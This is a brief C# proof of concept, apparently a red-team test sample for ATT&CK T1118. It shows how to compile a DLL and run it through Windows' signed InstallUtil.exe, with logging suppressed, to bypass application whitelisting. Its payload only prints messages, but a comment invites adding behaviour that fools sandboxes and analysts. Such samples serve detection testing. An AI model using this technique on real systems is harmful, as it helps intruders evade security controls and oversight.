using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library T1118.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false T1118.dll
*/

public class Program
{
	public static void Main()
	{
		Console.WriteLine("Hey There From Main()");
		//Add any behaviour here to throw off sandbox execution/analysts :)
        //These binaries can exhibit one behavior when executed in sandbox, and entirely different one when invoked
        //by InstallUtil.exe
	}

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	public override void Uninstall(System.Collections.IDictionary savedState)
	{

		Console.WriteLine("Hello There From Uninstall, If you are reading this, prevention has failed.\n");
	}
}
